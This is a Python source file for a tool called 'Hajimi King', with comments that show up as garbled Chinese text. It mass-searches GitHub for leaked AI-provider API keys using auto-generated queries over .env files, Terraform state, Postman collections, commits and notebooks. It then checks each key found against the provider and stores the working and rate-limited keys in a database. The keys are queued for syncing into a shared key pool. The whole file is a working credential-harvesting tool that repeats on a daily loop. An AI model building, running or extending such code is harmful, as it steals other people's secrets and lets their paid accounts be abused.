"""
Hajimi King - æ•°æ®åº“ç‰ˆæœ¬
ä½¿ç”¨ SQLite æ•°æ®åº“æ›¿ä»£æ–‡æœ¬æ–‡ä»¶
"""
import os
import random
import sys
import time
import traceback
from datetime import datetime, timedelta
from typing import Dict, List, Any

from common.Logger import logger

sys.path.append('../')
from common.config import config
from utils.github_client import GitHubClient
from utils.db_manager import db_manager
from utils.file_manager import file_manager  # ä¿ç•™ç”¨äºåŠ è½½ queries
from utils.sync_utils import sync_utils
from web.database import init_db

# åˆå§‹åŒ–æ•°æ®åº“
init_db()

# åˆ›å»ºGitHubå·¥å…·å®ä¾‹
github_utils = GitHubClient.create_instance(config.GITHUB_TOKENS)

# ç»Ÿè®¡ä¿¡æ¯
skip_stats = {
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}


def should_skip_item(item: Dict[str, Any]) -> tuple[bool, str]:
    """
    æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡å¤„ç†æ­¤item

    Returns:
        tuple: (should_skip, reason)
    """
    # æ£€æŸ¥SHAæ˜¯å¦å·²æ‰«æï¼ˆä½¿ç”¨æ•°æ®åº“ï¼‰
    file_sha = item.get("sha")
    if file_sha and db_manager.is_file_scanned(file_sha):
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    # æ£€æŸ¥ä»“åº“å¹´é¾„
    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        try:
            repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
            if repo_pushed_dt < datetime.utcnow() - timedelta(days=config.DATE_RANGE_DAYS):
                skip_stats["age_filter"] += 1
                return True, "age_filter"
        except Exception as e:
            logger.warning(f"Failed to parse repo_pushed_at: {e}")

    # æ£€æŸ¥æ–‡æ¡£å’Œç¤ºä¾‹æ–‡ä»¶
    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""


def process_item(item: Dict[str, Any]) -> tuple:
    """
    å¤„ç†å•ä¸ªGitHubæœç´¢ç»“æœitem

    Returns:
        tuple: (valid_keys_count, rate_limited_keys_count)
    """
    delay = random.uniform(1, 5)
    file_url = item["html_url"]
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    file_sha = item.get("sha")

    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"âš ï¸ Failed to fetch content for file: {file_url}")
        return 0, 0

    # ä½¿ç”¨åŸºäºé…ç½®çš„å¤šä¾›åº”å•†å¯†é’¥æå–
    from app.providers.config_key_extractor import config_key_extractor
    all_keys = config_key_extractor.extract_all_keys(content)

    if not all_keys:
        # æ ‡è®°æ–‡ä»¶ä¸ºå·²æ‰«æï¼ˆå³ä½¿æ²¡æœ‰æ‰¾åˆ°å¯†é’¥ï¼‰
        if file_sha:
            try:
                repo_pushed_at_str = item["repository"].get("pushed_at")
                repo_pushed_at = datetime.strptime(repo_pushed_at_str, "%Y-%m-%dT%H:%M:%SZ") if repo_pushed_at_str else None

                db_manager.mark_file_scanned(
                    file_sha=file_sha,
                    repo=repo_name,
                    file_path=file_path,
                    file_url=file_url,
                    keys_found=0,
                    valid_keys_count=0,
                    repo_pushed_at=repo_pushed_at
                )
            except Exception as e:
                logger.error(f"Failed to mark file as scanned: {e}")

        return 0, 0

    total_valid_keys = 0
    total_rate_limited_keys = 0
    total_keys_found = 0

    # å¤„ç†æ¯ä¸ªä¾›åº”å•†çš„å¯†é’¥
    for provider_name, keys in all_keys.items():
        if not keys:
            continue

        logger.info(f"ğŸ”‘ Found {len(keys)} {provider_name} suspected key(s), validating...")

        # è¿‡æ»¤å ä½ç¬¦å¯†é’¥
        filtered_keys = []
        for key in keys:
            context_index = content.find(key)
            if context_index != -1:
                snippet = content[context_index:context_index + 45]
                if "..." in snippet or "YOUR_" in snippet.upper():
                    continue
            filtered_keys.append(key)

        # å»é‡å¤„ç†
        keys = list(set(filtered_keys))

        if not keys:
            continue

        valid_keys = []
        rate_limited_keys = []
        invalid_keys = []

        # è·å–ä¾›åº”å•†å®ä¾‹å¹¶éªŒè¯å¯†é’¥
        try:
            from app.providers.config_based_factory import ConfigBasedAIProviderFactory
            provider = ConfigBasedAIProviderFactory.get_provider_by_name(provider_name)

            if not provider:
                logger.warning(f"âŒ Provider {provider_name} not found in configuration")
                continue

            for key in keys:
                total_keys_found += 1

                validation_result = provider.validate_key(key)

                if validation_result and "ok" in validation_result:
                    valid_keys.append(key)
                    logger.info(f"âœ… VALID {provider_name.upper()}: {key}")

                    # ä¿å­˜åˆ°æ•°æ®åº“
                    group_name = config_key_extractor.get_gpt_load_group_name(provider_name)
                    db_manager.save_api_key(
                        api_key=key,
                        provider=provider_name,
                        status='valid',
                        source_repo=repo_name,
                        source_file_path=file_path,
                        source_file_url=file_url,
                        source_file_sha=file_sha,
                        gpt_load_group_name=group_name,
                        metadata={'validation_result': validation_result}
                    )

                elif "rate_limited" in validation_result:
                    rate_limited_keys.append(key)
                    logger.warning(f"âš ï¸ RATE LIMITED {provider_name.upper()}: {key}")

                    # ä¿å­˜åˆ°æ•°æ®åº“
                    group_name = config_key_extractor.get_gpt_load_group_name(provider_name)
                    db_manager.save_api_key(
                        api_key=key,
                        provider=provider_name,
                        status='rate_limited',
                        source_repo=repo_name,
                        source_file_path=file_path,
                        source_file_url=file_url,
                        source_file_sha=file_sha,
                        gpt_load_group_name=group_name,
                        metadata={'validation_result': validation_result}
                    )

                else:
                    invalid_keys.append(key)
                    logger.info(f"âŒ INVALID {provider_name.upper()}: {key}, result: {validation_result}")

                    # ä¿å­˜åˆ°æ•°æ®åº“
                    db_manager.save_api_key(
                        api_key=key,
                        provider=provider_name,
                        status='invalid',
                        source_repo=repo_name,
                        source_file_path=file_path,
                        source_file_url=file_url,
                        source_file_sha=file_sha,
                        metadata={'validation_result': validation_result}
                    )

        except Exception as e:
            logger.error(f"âŒ Error validating {provider_name} keys: {e}")
            continue

        # æ·»åŠ æœ‰æ•ˆå¯†é’¥åˆ°åŒæ­¥é˜Ÿåˆ—
        if valid_keys:
            try:
                group_name = config_key_extractor.get_gpt_load_group_name(provider_name)
                sync_utils.add_keys_to_queue(valid_keys, provider_name, group_name)
                logger.info(f"ğŸ“¥ Added {len(valid_keys)} {provider_name} key(s) to sync queues (Group: {group_name})")
            except Exception as e:
                logger.error(f"ğŸ“¥ Error adding {provider_name} keys to sync queues: {e}")

        total_valid_keys += len(valid_keys)
        total_rate_limited_keys += len(rate_limited_keys)

    # æ ‡è®°æ–‡ä»¶ä¸ºå·²æ‰«æ
    if file_sha:
        try:
            repo_pushed_at_str = item["repository"].get("pushed_at")
            repo_pushed_at = datetime.strptime(repo_pushed_at_str, "%Y-%m-%dT%H:%M:%SZ") if repo_pushed_at_str else None

            db_manager.mark_file_scanned(
                file_sha=file_sha,
                repo=repo_name,
                file_path=file_path,
                file_url=file_url,
                keys_found=total_keys_found,
                valid_keys_count=total_valid_keys,
                repo_pushed_at=repo_pushed_at
            )
        except Exception as e:
            logger.error(f"Failed to mark file as scanned: {e}")

    return total_valid_keys, total_rate_limited_keys


def print_skip_stats():
    """æ‰“å°è·³è¿‡ç»Ÿè®¡ä¿¡æ¯"""
    total_skipped = sum(skip_stats.values())
    if total_skipped > 0:
        logger.info(f"ğŸ“Š Skipped {total_skipped} items - Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}")


def reset_skip_stats():
    """é‡ç½®è·³è¿‡ç»Ÿè®¡"""
    global skip_stats
    skip_stats = {"sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}


def main():
    start_time = datetime.now()

    # æ‰“å°ç³»ç»Ÿå¯åŠ¨ä¿¡æ¯
    logger.info("=" * 60)
    logger.info("ğŸš€ HAJIMI KING STARTING (Database Mode)")
    logger.info("=" * 60)
    logger.info(f"â° Started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    # 1. æ£€æŸ¥é…ç½®
    if not config.check():
        logger.info("âŒ Config check failed. Exiting...")
        sys.exit(1)

    # 2. æ˜¾ç¤ºæ•°æ®åº“çŠ¶æ€
    stats = db_manager.get_stats_summary()
    logger.info("ğŸ“Š DATABASE STATUS:")
    logger.info(f"   Total keys: {stats['total_keys']}")
    logger.info(f"   Valid keys: {stats['valid_keys']}")
    logger.info(f"   Rate limited: {stats['rate_limited_keys']}")
    logger.info(f"   Invalid: {stats['invalid_keys']}")
    logger.info(f"   Today's keys: {stats['today_keys']}")

    # 3. æ˜¾ç¤ºåŒæ­¥çŠ¶æ€
    if sync_utils.balancer_enabled or config.parse_bool(config.GPT_LOAD_SYNC_ENABLED):
        logger.info("ğŸ”— SYNC STATUS:")
        if stats['pending_balancer_sync'] > 0:
            logger.info(f"   Pending Balancer sync: {stats['pending_balancer_sync']}")
        if stats['pending_gpt_load_sync'] > 0:
            logger.info(f"   Pending GPT Load sync: {stats['pending_gpt_load_sync']}")

    # 4. æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯
    # 1) è‡ªåŠ¨ç”ŸæˆæŸ¥è¯¢ï¼ˆåŸºäºä¾›åº”å•†çš„ key_patternsï¼‰
    auto_queries = []
    providers = config.AI_PROVIDERS_CONFIG

    # åŸºç¡€è¯­è¨€åˆ—è¡¨
    languages = ['python', 'javascript', 'typescript', 'go', 'java', 'kotlin', 'php', 'ruby', 'rust', 'csharp', 'c++', 'swift', 'dart', 'html', 'css']

    # é…ç½®æ–‡ä»¶è·¯å¾„åˆ‡ç‰‡
    config_paths = ['/', 'config', 'src', 'app', 'server', 'api', 'lib', 'tests', 'db', 'scripts']

    for provider in providers:
        patterns = provider.get('key_patterns', [])
        provider_name = provider.get('name', '').upper()
        api_endpoint = provider.get('api_endpoint', '')

        for pattern in patterns:
            # ä»æ­£åˆ™æå–å…³é”®å‰ç¼€ï¼ˆå¦‚ AIzaSy, sk-ï¼‰
            import re
            if pattern.startswith('AIzaSy'):
                prefix = 'AIzaSy'
            elif pattern.startswith('sk-'):
                prefix = 'sk-'
            elif pattern.startswith('csk-'):
                prefix = 'csk-'
            else:
                # å°è¯•æå–å‰3-10ä¸ªéæ­£åˆ™å­—ç¬¦
                match = re.match(r'^([A-Za-z0-9\-_]{3,10})', pattern)
                if match:
                    prefix = match.group(1)
                else:
                    continue

            # === 1. é«˜ç²¾åº¦æŸ¥è¯¢ï¼ˆæ— éœ€åˆ‡ç‰‡ï¼‰===
            auto_queries.append(f'filename:"postman_collection.json" "{prefix}"')
            auto_queries.append(f'extension:tfstate "{prefix}"')
            auto_queries.append(f'extension:tfplan "{prefix}"')
            auto_queries.append(f'"{prefix}" in:commit')

            # === 2. å˜é‡åæ¨¡å¼ï¼ˆæŒ‰è¯­è¨€åˆ‡ç‰‡ï¼‰===
            for lang in languages:
                # æ ‡å‡†å˜é‡å
                auto_queries.append(f'"{provider_name}_API_KEY" = "{prefix}" language:{lang}')
                auto_queries.append(f'"{provider_name}_API_KEY": "{prefix}" language:{lang}')

                # æ³¨é‡Šæ¨¡å¼
                auto_queries.append(f'"// {prefix}" language:{lang}')
                auto_queries.append(f'"# {prefix}" language:{lang}')
                auto_queries.append(f'TODO "{prefix}" language:{lang}')
                auto_queries.append(f'FIXME "{prefix}" language:{lang}')

                # APIåŸŸåå…³è”ï¼ˆå¦‚æœæœ‰ï¼‰
                if api_endpoint:
                    auto_queries.append(f'"{api_endpoint}" "{prefix}" language:{lang}')

            # === 3. é…ç½®æ–‡ä»¶æ¨¡å¼ï¼ˆæŒ‰è·¯å¾„åˆ‡ç‰‡ï¼‰===
            env_files = ['.env', '.env.local', '.env.dev', '.env.development', '.env.prod', '.env.production', '.env.staging']
            for env_file in env_files:
                for path in config_paths:
                    auto_queries.append(f'filename:{env_file} "{prefix}" path:{path}')

            # YAML/JSON/TOML é…ç½®æ–‡ä»¶
            for ext in ['yaml', 'yml', 'toml']:
                for path in config_paths:
                    auto_queries.append(f'extension:{ext} "{prefix}" path:{path}')

            # === 4. ç‰¹å®šæ–‡ä»¶ç±»å‹ï¼ˆæœ€å°åˆ‡ç‰‡ï¼‰===
            auto_queries.append(f'extension:ipynb "{prefix}" key')
            auto_queries.append(f'extension:log "{prefix}" error')

            # === 5. æ³¨é‡Šå’Œæ–‡æ¡£æ¨¡å¼ ===
            auto_queries.append(f'extension:md "{prefix}"')
            auto_queries.append(f'"<!-- {prefix}"')
            auto_queries.append(f'"/* {prefix}"')

            # === 6. éæ ‡å‡†é…ç½®æ–‡ä»¶ ===
            auto_queries.append(f'filename:config.yml "{prefix}"')
            auto_queries.append(f'filename:settings.py "{prefix}"')
            auto_queries.append(f'filename:secret "{prefix}"')
            auto_queries.append(f'path:.git "{prefix}"')

    # 2) åŠ è½½è‡ªå®šä¹‰é«˜çº§æŸ¥è¯¢ï¼ˆqueries.txtï¼‰
    custom_queries = file_manager.get_search_queries()

    # 3) åˆå¹¶ï¼šå…ˆè‡ªåŠ¨æŸ¥è¯¢ï¼Œå†è‡ªå®šä¹‰æŸ¥è¯¢
    search_queries = auto_queries + custom_queries

    if auto_queries:
        logger.info(f"ğŸ¤– Auto-generated {len(auto_queries)} queries from {len(providers)} provider(s)")
    if custom_queries:
        logger.info(f"ğŸ“ Loaded {len(custom_queries)} custom queries from queries.txt")
    if not search_queries:
        logger.warning("âš ï¸ No search queries available (no providers and no queries.txt)")

    logger.info("ğŸ“‹ SYSTEM INFORMATION:")
    logger.info(f"ğŸ”‘ GitHub tokens: {len(config.GITHUB_TOKENS)} configured")
    logger.info(f"ğŸ” Search queries: {len(search_queries)} loaded")
    logger.info(f"ğŸ“… Date filter: {config.DATE_RANGE_DAYS} days")
    if config.PROXY_LIST:
        logger.info(f"ğŸŒ Proxy: {len(config.PROXY_LIST)} proxies configured")

    logger.info("âœ… System ready - Starting mining")
    logger.info("=" * 60)

    total_keys_found = 0
    total_rate_limited_keys = 0
    loop_count = 0

    while True:
        try:
            loop_count += 1
            logger.info(f"ğŸ”„ Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")

            query_count = 0
            loop_processed_files = 0
            reset_skip_stats()

            for i, q in enumerate(search_queries, 1):
                res = github_utils.search_for_keys(q)

                if res and "items" in res:
                    items = res["items"]
                    if items:
                        query_valid_keys = 0
                        query_rate_limited_keys = 0
                        query_processed = 0

                        for item_index, item in enumerate(items, 1):
                            # æ¯20ä¸ªitemæ˜¾ç¤ºè¿›åº¦
                            if item_index % 20 == 0:
                                logger.info(
                                    f"ğŸ“ˆ Progress: {item_index}/{len(items)} | query: {q} | current valid: {query_valid_keys} | total valid: {total_keys_found}")

                            # æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡æ­¤item
                            should_skip, skip_reason = should_skip_item(item)
                            if should_skip:
                                continue

                            # å¤„ç†å•ä¸ªitem
                            valid_count, rate_limited_count = process_item(item)

                            query_valid_keys += valid_count
                            query_rate_limited_keys += rate_limited_count
                            query_processed += 1
                            loop_processed_files += 1

                        total_keys_found += query_valid_keys
                        total_rate_limited_keys += query_rate_limited_keys

                        if query_processed > 0:
                            logger.info(f"âœ… Query {i}/{len(search_queries)} complete - Processed: {query_processed}, Valid: +{query_valid_keys}, Rate limited: +{query_rate_limited_keys}")
                        else:
                            logger.info(f"â­ï¸ Query {i}/{len(search_queries)} complete - All items skipped")

                        print_skip_stats()
                    else:
                        logger.info(f"ğŸ“­ Query {i}/{len(search_queries)} - No items found")
                else:
                    logger.warning(f"âŒ Query {i}/{len(search_queries)} failed")

                query_count += 1

                if query_count % 5 == 0:
                    logger.info(f"â¸ï¸ Processed {query_count} queries, taking a break...")
                    time.sleep(1)

            logger.info(f"ğŸ Loop #{loop_count} complete - Processed {loop_processed_files} files | Total valid: {total_keys_found} | Total rate limited: {total_rate_limited_keys}")

            # è®¡ç®—ä¸‹æ¬¡æ‰§è¡Œæ—¶é—´ï¼ˆæ¯å¤©å®šæ—¶æ‰§è¡Œä¸€æ¬¡ï¼‰
            now = datetime.now()

            # ä»ç¯å¢ƒå˜é‡è¯»å–æ‰§è¡Œå°æ—¶ï¼ˆé»˜è®¤å‡Œæ™¨3ç‚¹ï¼‰
            run_hour = int(os.getenv("DAILY_RUN_HOUR", "3"))

            # è®¡ç®—ä¸‹æ¬¡æ‰§è¡Œæ—¶é—´
            next_run = now.replace(hour=run_hour, minute=0, second=0, microsecond=0)
            if next_run <= now:
                # å¦‚æœä»Šå¤©çš„æ—¶é—´å·²è¿‡ï¼Œè®¾ç½®ä¸ºæ˜å¤©
                next_run += timedelta(days=1)

            sleep_seconds = (next_run - now).total_seconds()
            sleep_hours = sleep_seconds / 3600

            logger.info(f"ğŸ’¤ Next run at: {next_run.strftime('%Y-%m-%d %H:%M:%S')} (in {sleep_hours:.1f} hours)")
            time.sleep(sleep_seconds)

        except KeyboardInterrupt:
            logger.info("â›” Interrupted by user")
            logger.info(f"ğŸ“Š Final stats - Valid keys: {total_keys_found}, Rate limited: {total_rate_limited_keys}")
            logger.info("ğŸ”š Shutting down sync utils...")
            sync_utils.shutdown()
            break
        except Exception as e:
            logger.error(f"ğŸ’¥ Unexpected error: {e}")
            traceback.print_exc()
            logger.info("ğŸ”„ Waiting 60s before retry...")
            time.sleep(60)
            continue


if __name__ == "__main__":
    main()
